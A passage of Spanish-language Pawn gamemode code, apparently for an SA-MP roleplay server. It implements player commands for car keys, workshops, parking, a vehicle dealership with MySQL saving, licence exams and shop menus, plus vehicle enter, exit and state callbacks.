		if(!GetPlayersProx(5.0, playerid, PrestadorCoche[playerid]))
		{
		    PrestadorCoche[playerid] = NOEXISTE;
    		LlavePrestada[playerid] = NOEXISTE;
			SendClientMessage(playerid, Rojo, "* Demasiado lejos.");
			return 1;
		}
		
		new tieneslotlibre = -1;
		for(new x=0; x<5; x++)
		{
		    if(PlayerInfo[playerid][pLlaveCochePrestado][x] == 0){tieneslotlibre = x; break;}
		}
		if(tieneslotlibre == -1){SendClientMessage(playerid, Rojo, "* Tienes todos los slots de llaves prestadas ocupados."); return 1;}
		
		PlayerInfo[playerid][pLlaveCochePrestado][tieneslotlibre] = LlavePrestada[playerid];

		format(string, sizeof(string), "Has aceptado la llave del coche LS-%d ofrecida por %s.", LlavePrestada[playerid], GetPlayerNameRP(PrestadorCoche[playerid]));
		SendClientMessage(playerid, Amarillo, string);
		format(string, sizeof(string), "%s ha aceptado tu llave del coche LS-%d.", GetPlayerNameRP(playerid), LlavePrestada[playerid]);
		SendClientMessage(PrestadorCoche[playerid], Amarillo, string);
		
		PrestadorCoche[playerid] = NOEXISTE;
		LlavePrestada[playerid] = NOEXISTE;
		return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/entrartaller", true) == 0) //Entrar a un taller privado
{
    if(!IsPlayerInAnyVehicle(playerid) || GetPlayerVehicleSeat(playerid) != 0){SendClientMessage(playerid,Rojo,"* No estás en un vehículo como conductor."); return 1;}
	new coche = GetPlayerVehicleID(playerid), taller;
	for(new n=1; n <= TotalNegs; n++)
	{
	    if(NegoInfo[n][nTipo] == 6 && IsVehicleInRangeOfPoint(2.0, coche, NegoInfo[n][nTallerEX], NegoInfo[n][nTallerEY], NegoInfo[n][nTallerEZ])){taller = n; break;}
	}
	if(taller == 0){SendClientMessage(playerid,Rojo,"* No se ha detectado ningún taller a tu alrededor."); return 1;}
	if(NegoInfo[taller][nCerrado] == 1){SendClientMessage(playerid,Rojo,"* El taller está cerrado."); return 1;}
	for(new i=0; i <= TotalVeh; i++)
    {
	    if(IsVehicleInRangeOfPoint(2.0, i, NegoInfo[taller][nTallerSX], NegoInfo[taller][nTallerSY], NegoInfo[taller][nTallerSZ]) && GetVehicleVirtualWorld(i) == NegoInfo[taller][nVirtualWorld])
		{
			SendClientMessage(playerid, Rojo, "* Hay un vehículo al otro lado, no se puede pasar.");
        	return 1;
		}
    }
    SetVehiclePos(coche, NegoInfo[taller][nTallerSX], NegoInfo[taller][nTallerSY], NegoInfo[taller][nTallerSZ]);
    SetVehicleZAngle(coche, NegoInfo[taller][nTallerSRotZ]);
    SetVehicleVirtualWorld(coche, NegoInfo[taller][nVirtualWorld]);
    LinkVehicleToInteriorEx(coche, NegoInfo[taller][nInterior]);
    SetPlayerVirtualWorld(playerid, NegoInfo[taller][nVirtualWorld]);
    SetPlayerInterior(playerid, NegoInfo[taller][nInterior]);
    for(new i=0; i<MAX_PLAYERS; i++)
    {
        if(GetPlayerVehicleID(i) == coche)
        {
            SetPlayerVirtualWorld(i, NegoInfo[taller][nVirtualWorld]);
            SetPlayerInterior(i, NegoInfo[taller][nInterior]);
        }
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/salirtaller", true) == 0) //Salir de un taller privado
{
    if(!IsPlayerInAnyVehicle(playerid) || GetPlayerVehicleSeat(playerid) != 0){SendClientMessage(playerid,Rojo,"* No estás en un vehículo como conductor."); return 1;}
	new coche = GetPlayerVehicleID(playerid), taller;
	taller = GetPlayerDentroNego(playerid);
	if(NegoInfo[taller][nTipo] != 6){SendClientMessage(playerid, Rojo, "* No estás dentro de un taller privado."); return 1;}
	for(new i=0; i <= TotalVeh; i++)
    {
	    if(IsVehicleInRangeOfPoint(2.0, i, NegoInfo[taller][nTallerEX], NegoInfo[taller][nTallerEY], NegoInfo[taller][nTallerEZ]) && GetVehicleVirtualWorld(i) == 0)
		{
			SendClientMessage(playerid, Rojo, "* Hay un vehículo al otro lado, no se puede pasar.");
        	return 1;
		}
    }
    SetVehiclePos(coche, NegoInfo[taller][nTallerEX], NegoInfo[taller][nTallerEY], NegoInfo[taller][nTallerEZ]);
    SetVehicleZAngle(coche, NegoInfo[taller][nTallerERotZ]);
    SetVehicleVirtualWorld(coche, 0);
    LinkVehicleToInteriorEx(coche, 0);
    SetPlayerVirtualWorld(playerid, 0);
    SetPlayerInterior(playerid, 0);
    for(new i=0; i<MAX_PLAYERS; i++)
    {
        if(GetPlayerVehicleID(i) == coche)
        {
            SetPlayerVirtualWorld(i, 0);
            SetPlayerInterior(i, 0);
        }
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/parking", true) == 0) //Entrar a un parking público o privado
{
	if(!IsPlayerInAnyVehicle(playerid) || GetPlayerVehicleSeat(playerid) != 0){SendClientMessage(playerid,Rojo,"* No estás en un vehículo como conductor."); return 1;}
	new coche = GetPlayerVehicleID(playerid);
	if(IsPlayerInRangeOfPoint(playerid, 4.0, 1585.6000000, -1678.8000500, 5.9000000)) //1ª planta parking LSPD
	{
        for(new i=0; i <= TotalVeh; i++)
	    {
		    if(IsVehicleInRangeOfPoint(6.0, i, -1605.3000500, 733.3000100, -5.2000000) && GetVehicleVirtualWorld(i) == 1)
			{
				SendClientMessage(playerid, Rojo, "* Hay un vehículo al otro lado, no se puede pasar.");
	        	return 1;
			}
	    }
		if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
		SetVehiclePos(coche, -1605.3000500, 733.3000100, -5.2000000);
		SetVehicleZAngle(coche, 0);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 4.0, -1605.3000500, 733.3000100, -5.2000000)) //2ª planta parking LSPD
	{
        for(new i=0; i <= TotalVeh; i++)
	    {
		    if(IsVehicleInRangeOfPoint(6.0, i, 1585.6000000, -1678.8000500, 5.9000000) && GetVehicleVirtualWorld(i) == 0)
			{
				SendClientMessage(playerid, Rojo, "* Hay un vehículo al otro lado, no se puede pasar.");
	        	return 1;
			}
	    }
		SetVehiclePos(coche, 1585.6000000, -1678.8000500, 5.9000000);
		SetVehicleZAngle(coche, 270);
	}
	else
	{
		SendClientMessage(playerid, Rojo, "* No estás en la puerta de un parking.");
	    return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/barrason", true) == 0) //Muestra barras de hambre y sed
{
	SendClientMessage(playerid, Amarillo, "Barras de hambre y sed activadas.");
    ShowPlayerProgressBar(playerid, hambrebar[playerid]);
    ShowPlayerProgressBar(playerid, sedbar[playerid]);
    TextDrawShowForPlayer(playerid, hambre[playerid]); //Textdraws hambre y sed
    TextDrawShowForPlayer(playerid, sed[playerid]);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/barrasoff", true) == 0) //Esconde barras de hambre y sed
{
	SendClientMessage(playerid, Amarillo, "Barras de hambre y sed desactivadas. '/BarrasON' para volver a activarlas.");
    HidePlayerProgressBar(playerid, hambrebar[playerid]);
    HidePlayerProgressBar(playerid, sedbar[playerid]);
    TextDrawHideForPlayer(playerid, hambre[playerid]); //Textdraws hambre y sed
    TextDrawHideForPlayer(playerid, sed[playerid]);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/nameoff", true) == 0) //Ocultar nombres
{
	PlayerNameOff[playerid] = 1;
	for(new i = 0;i <= MAX_PLAYERS; i++)
	{
		ShowPlayerNameTagForPlayer(playerid,i, 0);
	}
	SendClientMessage(playerid, Amarillo, "Nombres de jugadores desactivados, '/NameON' para volver a activarlos.");
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/nameon", true) == 0) //Mostrar nombres
{
	PlayerNameOff[playerid] = 0;
	for(new i = 0;i <= MAX_PLAYERS; i++)
	{
		ShowPlayerNameTagForPlayer(playerid,i, 1);
	}
	SendClientMessage(playerid, Amarillo, "Nombres de jugadores activados.");
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/catalogo", true) == 0) //Ver coches de concesionario
{
    if(GetPlayerConcesionario(playerid) > 0)
	{
		format(string, 128, "Bienvenido al concesionario %s, puede observar nuestra gama de vehículos.", Concesionarios[GetPlayerConcesionarioEx(playerid)][cNombre]);
		SendClientMessage(playerid, Amarillo, string);
		SendClientMessage(playerid, Naranja, "Pulsa SHIFT y ALT para ver los modelos.");
		SendClientMessage(playerid, Naranja, "Pulsa ENTER para salir del catálogo.");
		TogglePlayerControllable(playerid, 0);
		if(EnCatalogoVeh[playerid] == NOEXISTE)
		{
			TogglePlayerControllable(playerid,0);
			EnCatalogoVeh[playerid] = 1;
		}
		PConcesionario[playerid] = GetPlayerConcesionario(playerid);
		catalogovehiculos(playerid, PConcesionario[playerid]);
		TextDrawShowForPlayer(playerid,fila1);
		TextDrawShowForPlayer(playerid,fila2);
		TextDrawShowForPlayer(playerid,fila3);
		TextDrawShowForPlayer(playerid,fila4);
	}
	else{SendClientMessage(playerid, Rojo, "* No estás en un concesionario.");}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp("/comprarveh", cmd, true) == 0) //Comprar vehículos
{
    if(!GetPlayerConcesionario(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un concesionario."); return 1;}
    if(GetPlayerConcesionario(playerid) == 7 && PlayerInfo[playerid][pLicNavegacion] == 0){SendClientMessage(playerid, Rojo, "* Necesitas licencia de navegación para comprar vehículos aquí."); return 1;}
    if(GetPlayerConcesionario(playerid) == 6 && PlayerInfo[playerid][pLicAviacion] == 0){SendClientMessage(playerid, Rojo, "* Necesitas licencia de aviación para comprar vehículos aquí."); return 1;}
    if((GetPlayerConcesionario(playerid) >= 1 && GetPlayerConcesionario(playerid) <= 5) && PlayerInfo[playerid][pLicConduccion] == 0){SendClientMessage(playerid, Rojo, "* Necesitas licencia de conducción para comprar vehículos aquí."); return 1;}
	cmd = strtok(cmdtext,idx);
 	if(!strlen(cmd))
	{
		SendClientMessage(playerid, Naranja, "* /Comprarveh [VehículoID] [Color1] [Color2]");
		SendClientMessage(playerid, Naranja, "Puedes ver la lista de colores en el foro.");
	    return 1;
	}
	if(EnCatalogoVeh[playerid] != NOEXISTE){SendClientMessage(playerid, Rojo, "* Sal del catálogo primero."); return 1;}
	//GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
	new tmpcar;
	tmpcar = strval(cmd);
	if(datacar[tmpcar][dcNivel] > PlayerInfo[playerid][pNivel])
	{
		SendClientMessage(playerid, Rojo, "* Nivel insuficiente.");
		return 1;
	}
	
	new EspacioLibre;
	for(new x = 0; x < 5; x++)
	{
	    if(PlayerInfo[playerid][pLlaveCoche][x] == 0){EspacioLibre = 1; break;}
	}
	if(EspacioLibre == 0){SendClientMessage(playerid, Rojo, "* Ya tienes todos los slots de llaves propias ocupados."); return 1;}
	
	if(datacar[tmpcar][dcConcesionario] != GetPlayerConcesionario(playerid))
	{
		SendClientMessage(playerid, Rojo, "* No disponemos de ese modelo, deberás buscar en otro concesionario.");
        return 1;
	}
	
	new Conce2 = GetPlayerConcesionarioEx(playerid);
	for(new i=0; i <= TotalVeh; i++)
	{
		if(IsVehicleInRangeOfPoint(10.0, i, Concesionarios[Conce2][ctX], Concesionarios[Conce2][ctY], Concesionarios[Conce2][ctZ]))
		{
			SendClientMessage(playerid, Rojo, "* Hay un vehículo en el punto de entrega.");
			return 1;
		}
	}
	
	if(GetPlayerMoney(playerid) < datacar[tmpcar][dcPrecio] && PlayerInfo[playerid][pDineroBanco] < datacar[tmpcar][dcPrecio])
	{
		SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero ni en mano ni en el banco.");
		return 1;
	}
	
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
	    SendClientMessage(playerid, Naranja, "* /Comprarveh [VehículoID] [Color1] [Color2]");
		SendClientMessage(playerid, Naranja, "Puedes ver la lista de colores en el foro.");
	    return 1;
	}
	new color1;
	color1 = strval(tmp);
	
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
	    SendClientMessage(playerid, Naranja, "* /Comprarveh [VehículoID] [Color1] [Color2]");
		SendClientMessage(playerid, Naranja, "Puedes ver la lista de colores en el foro.");
	    return 1;
	}
	new color2;
	color2 = strval(tmp);

    for(new x; x < 5; x++)
	{
		if(PlayerInfo[playerid][pLlaveCoche][x] == 0)
		{
			PlayerInfo[playerid][pLlaveCoche][x] = CodigoLlave;
			break;
		}
	}
	
	SendClientMessage(playerid, Verde, "* Has comprado un nuevo vehículo.");
	SendClientMessage(playerid, Amarillo, "* El vendedor te ha entregado las llaves (/cuenta).");
	
	new Conce = datacar[tmpcar][dcConcesionario]-1;
	if(GetPlayerMoney(playerid) >= datacar[tmpcar][dcPrecio]){GivePlayerMoneyAC(playerid, -datacar[tmpcar][dcPrecio]);}
	else if(PlayerInfo[playerid][pDineroBanco] >= datacar[tmpcar][dcPrecio]){PlayerInfo[playerid][pDineroBanco] -= datacar[tmpcar][dcPrecio];}
	else{return 1;}
	new Coche = CreateVehicle(datacar[tmpcar][dcIDModel], Concesionarios[Conce][ctX], Concesionarios[Conce][ctY], Concesionarios[Conce][ctZ], 30.0, color1, color2, 3000000);
	CarInfo[Coche][cID] = Coche;
	CarInfo[Coche][cLlave] = CodigoLlave;
	CarInfo[Coche][cModelo] = datacar[tmpcar][dcIDModel];
	CarInfo[Coche][cPosX] = Concesionarios[Conce][ctX];
	CarInfo[Coche][cPosY] = Concesionarios[Conce][ctY];
	CarInfo[Coche][cPosZ] = Concesionarios[Conce][ctZ];
	CarInfo[Coche][cZAngle] = 30.0;
	CarInfo[Coche][cColor1] = color1;
	CarInfo[Coche][cColor2] = color2;
	CarInfo[Coche][cComprado] = 1;
	format(CarInfo[Coche][cDueno], MAX_PLAYER_NAME, "%s", PlayerInfo[playerid][pNombre]);
	format(CarInfo[Coche][cNombreModelo], MAX_PLAYER_NAME, "%s", datacar[tmpcar][dcNombre]);
	CarInfo[Coche][cValor] = datacar[tmpcar][dcPrecio];
	CarInfo[Coche][cGas] = 50;
	CarInfo[Coche][cMaxMaletero] = 7;
	
	new engine, lights, alarm, doors, bonnet, boot, objective;
	GetVehicleParamsEx(Coche, engine, lights, alarm, doors, bonnet, boot, objective);
	SetVehicleParamsEx(Coche, 0, 0, alarm, doors, bonnet, boot, objective);
	
	SetVehicleMatricula(Coche);
	
	format(string,sizeof(string),"INSERT INTO vehiculos (Llave, Modelo) VALUES ('%d','%d')",CarInfo[Coche][cLlave],CarInfo[Coche][cModelo]);
    mysql_query(1, string);
    
	new ccount;
	new sql[80], row[512];
    format(sql, sizeof(sql), "SELECT SQLID FROM vehiculos ORDER BY SQLID DESC");
	mysql_query(1, sql);
	mysql_store_result();
	mysql_fetch_row(row);
	ccount = strval(row);
	mysql_free_result();
	
	CarInfo[Coche][cSQLID] = ccount;
	
	SaveCar(Coche);
	
	CodigoLlave ++;
	TotalVeh ++;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp("/examen", cmd, true) == 0) //Examen permisos
{
    if(IsPlayerInRangeOfPoint(playerid, 2.0, AutoEscuelas[0][AutoX], AutoEscuelas[0][AutoY], AutoEscuelas[0][AutoZ])) //Autoescuela conducción
    {
        if(PlayerInfo[playerid][pLicConduccion] == 1){SendClientMessage(playerid, Rojo, "* Ya tienes la licencia de conducción."); return 1;}
        if(EnAutoEscuela[playerid] != 0){SendClientMessage(playerid, Rojo, "* Ya estás haciendo algún examen."); return 1;}
        if(GetPlayerMoney(playerid) < 700){SendClientMessage(playerid, Rojo, "* Necesitas 700$ para hacer este examen."); return 1;}
        TemaAutoescuelaCond(playerid, 0);
		EnAutoEscuela[playerid] = 1;
		CheckPointAutoEscuela[playerid] = 0;
		TogglePlayerControllable(playerid, 0);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2.0, AutoEscuelas[1][AutoX], AutoEscuelas[1][AutoY], AutoEscuelas[1][AutoZ])) //Autoescuela aviación
    {
        if(PlayerInfo[playerid][pLicAviacion] == 1){SendClientMessage(playerid, Rojo, "* Ya tienes la licencia de aviación."); return 1;}
        if(EnAutoEscuela[playerid] != 0){SendClientMessage(playerid, Rojo, "* Ya estás haciendo algún examen."); return 1;}
        if(PlayerInfo[playerid][pNivel] < 3){SendClientMessage(playerid, Rojo, "* Necesitas nivel 3 para hacer este examen."); return 1;}
        if(GetPlayerMoney(playerid) < 7000){SendClientMessage(playerid, Rojo, "* Necesitas 7000$ para hacer este examen."); return 1;}
        EnAutoEscuela[playerid] = 2;
		CheckPointAutoEscuela[playerid] = 0;
        SendClientMessage(playerid, Amarillo, "Sube a la avioneta para comenzar el examen.");
	  	SetTimerEx("TimerAutoescuela", 15000, false, "i", playerid);
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2.0, AutoEscuelas[2][AutoX], AutoEscuelas[2][AutoY], AutoEscuelas[2][AutoZ])) //Autoescuela navegación
    {
        if(PlayerInfo[playerid][pLicNavegacion] == 1){SendClientMessage(playerid, Rojo, "* Ya tienes la licencia de navegación."); return 1;}
        if(EnAutoEscuela[playerid] != 0){SendClientMessage(playerid, Rojo, "* Ya estás haciendo algún examen."); return 1;}
        if(PlayerInfo[playerid][pNivel] < 3){SendClientMessage(playerid, Rojo, "* Necesitas nivel 3 para hacer este examen."); return 1;}
        if(GetPlayerMoney(playerid) < 1000){SendClientMessage(playerid, Rojo, "* Necesitas 1000$ para hacer este examen."); return 1;}
		EnAutoEscuela[playerid] = 3;
		CheckPointAutoEscuela[playerid] = 0;
		SendClientMessage(playerid, Amarillo, "Sube a la lancha para comenzar el examen.");
	  	SetTimerEx("TimerAutoescuela", 15000, false, "i", playerid);
    }
    else{SendClientMessage(playerid, Rojo, "* No estás en un lugar donde conseguir una licencia.");}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp("/licencias", cmd, true) == 0) //Muestra licencias al jugador
{
    SendClientMessage(playerid, Amarillo, "|__________Licencias__________|");
	new licencia[3];
	licencia = "No";
	if(PlayerInfo[playerid][pLicConduccion] == 1)licencia = "Sí";
	format(string, sizeof(string), "Licencia conducción: %s", licencia);
	SendClientMessage(playerid, AmarilloClaro, string);
	licencia = "No";
	if(PlayerInfo[playerid][pLicAviacion] == 1)licencia = "Sí";
	format(string, sizeof(string), "Licencia aviación: %s", licencia);
	SendClientMessage(playerid, AmarilloClaro, string);
	licencia = "No";
	if(PlayerInfo[playerid][pLicNavegacion] == 1)licencia = "Sí";
	format(string, sizeof(string), "Licencia navegación: %s", licencia);
	SendClientMessage(playerid, AmarilloClaro, string);
	licencia = "No";
	if(PlayerInfo[playerid][pLicArmas] == 1)licencia = "Sí";
	format(string, sizeof(string), "Licencia armas: %s", licencia);
	SendClientMessage(playerid, AmarilloClaro, string);
	licencia = "No";
	if(PlayerInfo[playerid][pLicPesca] == 1)licencia = "Sí";
	format(string, sizeof(string), "Licencia pesca: %s", licencia);
	SendClientMessage(playerid, AmarilloClaro, string);
	licencia = "No";
	if(PlayerInfo[playerid][pLicCaza] == 1)licencia = "Sí";
	format(string, sizeof(string), "Licencia caza: %s", licencia);
	SendClientMessage(playerid, AmarilloClaro, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp("/comprar", cmd, true) == 0) //Muestra licencias al jugador
{
	if(!GetPlayerDentroNego(playerid)){SendClientMessage(playerid, Rojo, "* No estás en un local."); return 1;}
	if(!EstaEnMostrador(playerid)){SendClientMessage(playerid, Rojo, "* Debes estar en el mostrador de la tienda."); return 1;}
	new n = GetPlayerDentroNego(playerid);
	if(NegoInfo[n][nTipo] == 1) //Restaurantes
	{
	    ShowMenuForPlayer(restaurantes, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 2) //Bares
	{
	    ShowMenuForPlayer(bares, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 3) //Comidas rápidas
	{
	    ShowMenuForPlayer(comidasrapidas, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 4) //Discotecas
	{
	    ShowMenuForPlayer(discoteca, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 5) //Puticlubs
	{
	    ShowMenuForPlayer(puticlub, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 7) //Ammu Nations
	{
	    if(PlayerInfo[playerid][pServicioPD] > 0){SendClientMessage(playerid, Rojo, "* No puedes comprar aquí estando de servicio como policía."); return 1;}
	    if(PlayerInfo[playerid][pLicArmas] == 0){SendClientMessage(playerid, Rojo, "* Necesitas licencia de armas para comprar aquí."); return 1;}
	    ShowMenuForPlayer(ammunation, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 8) //24/7
	{
	    ShowMenuForPlayer(menu247, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 9) //Tienda deportiva
	{
	    if(PlayerInfo[playerid][pServicioPD] > 0){SendClientMessage(playerid, Rojo, "* No puedes comprar aquí estando de servicio como policía."); return 1;}
	    ShowMenuForPlayer(tiendadeportes, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 10) //Ferretería
	{
	    if(PlayerInfo[playerid][pServicioPD] > 0){SendClientMessage(playerid, Rojo, "* No puedes comprar aquí estando de servicio como policía."); return 1;}
	    ShowMenuForPlayer(ferreteria, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 11) //Tienda ropa
	{
	    ShowMenuForPlayer(tiendaropa, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 12) //Tienda electrónica
	{
	    ShowMenuForPlayer(electronica, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 18) //Estanco
	{
	    ShowMenuForPlayer(estanco, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	if(NegoInfo[n][nTipo] == 19) //licoreria
	{
	    ShowMenuForPlayer(licoreria, playerid);
		TogglePlayerControllable(playerid, 0);
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/id", true) == 0)
{
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /ID [ID/Nombre_Apellido]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid, Rojo, "* ID inválida o más de un jugador encontrados con ese nombre."); return 1;}
	format(string, sizeof(string), "- %s (ID: %d)", GetPlayerNameRP(playerid2), playerid2);
	SendClientMessage(playerid, Amarillo, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------
SendClientMessage(playerid, AmarilloClaro, "* Comando desconocido, utiliza '/Ayuda'.");
return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
    oldcarid[playerid] = vehicleid;
    if(CocheLSPD(vehicleid) && PlayerInfo[playerid][pFaccion] != 1 && !ispassenger) //Si entra a un vehiculo policial y no es del LSPD, impedirle entrar.
    {
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		SetPlayerPos(playerid, X, Y, Z);
    }
    if(PlayerInfo[playerid][pMuerto] > 0) //Si entra a un vehiculo estando crack
    {
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		SetPlayerPos(playerid, X, Y, Z);
    }
    return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
    VenderVeh[playerid] = 0;
    if(CinturonPuesto[playerid] == 1) //Quitarse cinturón
    {
        new string[128];
        format(string, sizeof(string), "* %s se quita el cinturón de seguridad.", GetPlayerNameRP(playerid));
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
        CinturonPuesto[playerid] = 0;
    }
    if(CocheLSN(vehicleid))
    {
        if(DirectoLSNCoche[vehicleid] == playerid)
        {
            DirectoLSNCoche[vehicleid] = NOEXISTE;
            for(new i=0; i<MAX_PLAYERS; i++)
            {
                if(GetPlayerVehicleID(i) == vehicleid)SendClientMessage(i, NaranjaOscuro, "Este vehículo ha dejado de emitir en directo.");
            }
        }
    }
    if(TaxiConductor[playerid] != NOEXISTE)
    {
        new taxista = TaxiConductor[playerid], string[128];
        format(string, sizeof(string), "Has pagado a %s %d$ por el transporte en taxi.", GetPlayerNameRP(taxista), TaxiCoste[playerid]);
        SendClientMessage(playerid, Verde, string);
        format(string, sizeof(string), "%s te ha pagado %d$ por el transporte en taxi.", GetPlayerNameRP(playerid), TaxiCoste[playerid]);
        SendClientMessage(taxista, Verde, string);
        TaxiConductor[playerid] = NOEXISTE;
        TaxiPasajero[taxista] = NOEXISTE;
		TaxiCoste[playerid] = 0;
		return 1;
    }
    if(TaxiPasajero[playerid] != NOEXISTE)
    {
        new pasajero = TaxiPasajero[playerid], string[128];
        format(string, sizeof(string), "Has pagado a %s %d$ por el transporte en taxi.", GetPlayerNameRP(playerid), TaxiCoste[pasajero]);
        SendClientMessage(pasajero, Verde, string);
        format(string, sizeof(string), "%s te ha pagado %d$ por el transporte en taxi.", GetPlayerNameRP(pasajero), TaxiCoste[pasajero]);
        SendClientMessage(playerid, Verde, string);
        TaxiConductor[pasajero] = NOEXISTE;
        TaxiPasajero[playerid] = NOEXISTE;
		TaxiCoste[pasajero] = 0;
		return 1;
    }
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(oldstate == 2) //Era conductor
	{
	    TextDrawHideForPlayer(playerid,box[playerid]); //Velocímetro
		TextDrawHideForPlayer(playerid,vvel[playerid]);
		TextDrawHideForPlayer(playerid,fuel[playerid]);
		if(EnAutoEscuela[playerid] == 1)
		{
		    SendClientMessage(playerid, Rojo, "Tienes 10 segundos para volver al vehículo y seguir la parte práctica del examen.");
	  		SetTimerEx("TimerAutoescuela", 10000, false, "i", playerid);
		}
		if(EnAutoEscuela[playerid] == 2)
		{
		    SendClientMessage(playerid, Rojo, "Tienes 10 segundos para volver al avión.");
	  		SetTimerEx("TimerAutoescuela", 10000, false, "i", playerid);
		}
		if(EnAutoEscuela[playerid] == 3)
		{
		    SendClientMessage(playerid, Rojo, "Tienes 10 segundos para volver a la lancha.");
	  		SetTimerEx("TimerAutoescuela", 10000, false, "i", playerid);
		}
		if(Trabajando[playerid] == 1) //Trabajando
		{
		    if(PlayerInfo[playerid][pTrabajo] == 1) //Pizzero
		    {
		        SendClientMessage(playerid, Rojo, "Tienes 20 segundos para volver a la moto.");
		        TimerDejarTrabajar[playerid] = SetTimerEx("TimerDejarTrabajarF", 20000, false, "i", playerid);
		    }
		    if(PlayerInfo[playerid][pTrabajo] == 2) //Barrendero
		    {
		        SendClientMessage(playerid, Rojo, "Tienes 20 segundos para volver al limpiacalles.");
		        TimerDejarTrabajar[playerid] = SetTimerEx("TimerDejarTrabajarF", 20000, false, "i", playerid);
		    }
		    if(PlayerInfo[playerid][pTrabajo] == 3) //Securicar
		    {
		        SendClientMessage(playerid, Rojo, "Tienes 20 segundos para volver al securicar.");
		        TimerDejarTrabajar[playerid] = SetTimerEx("TimerDejarTrabajarF", 20000, false, "i", playerid);
		    }
		    if(PlayerInfo[playerid][pTrabajo] == 4) //Cosechador
		    {
		        SendClientMessage(playerid, Rojo, "Tienes 20 segundos para volver a la cosechadora.");
		        TimerDejarTrabajar[playerid] = SetTimerEx("TimerDejarTrabajarF", 20000, false, "i", playerid);
		    }
		    if(PlayerInfo[playerid][pTrabajo] == 5) //Fumigador aéreo
		    {
		        SendClientMessage(playerid, Rojo, "Tienes 20 segundos para volver al avión.");
		        TimerDejarTrabajar[playerid] = SetTimerEx("TimerDejarTrabajarF", 20000, false, "i", playerid);
		    }
		    if(PlayerInfo[playerid][pTrabajo] == 9) //Pescador
		    {
		        SendClientMessage(playerid, Rojo, "Tienes 20 segundos para volver al barco.");
		        TimerDejarTrabajar[playerid] = SetTimerEx("TimerDejarTrabajarF", 20000, false, "i", playerid);
		    }
		}
	}
	if(newstate == 2) //Es conductor
	{
	    VehicleHack[playerid] ++;
	    //CurrentVeh[playerid] = GetPlayerVehicleID(playerid);
	    if(VehicleHack[playerid] > 3)
	    {
			new string[128], Nombre[34];
			GetPlayerName(playerid, Nombre, sizeof(Nombre));
	        format(string, sizeof(string), "* %s ha sido kickeado automáticamente por hacks de vehículos.", Nombre);
	        SendClientMessageToAll(Rojo, string);
	        printf(string);
	       	KickL(playerid);
	       	VehicleHack[playerid] = 0;
	        return 1;
	    }
	    TextDrawShowForPlayer(playerid,box[playerid]); //Velocímetro
		TextDrawShowForPlayer(playerid,vvel[playerid]);
		TextDrawShowForPlayer(playerid,fuel[playerid]);
		if(CocheGOB(GetPlayerVehicleID(playerid)) && (PlayerInfo[playerid][pFaccion] == 0 || PlayerInfo[playerid][pFaccion] > 3)) //Es coche del gobierno
		{
		    SendClientMessage(playerid, Rojo, "* No formas parte del gobierno.");
			RemovePlayerFromVehicle(playerid);
			return 1;
		}
		if(CocheLSN(GetPlayerVehicleID(playerid)) && PlayerInfo[playerid][pFaccion] != 4) //Es coche del LSRTV
		{
		    SendClientMessage(playerid, Rojo, "* No formas parte de LSRTV.");
			RemovePlayerFromVehicle(playerid);
			return 1;
		}
	    if(CocheAutoescuelaCond(GetPlayerVehicleID(playerid))) //autoescuela conducir
	    {
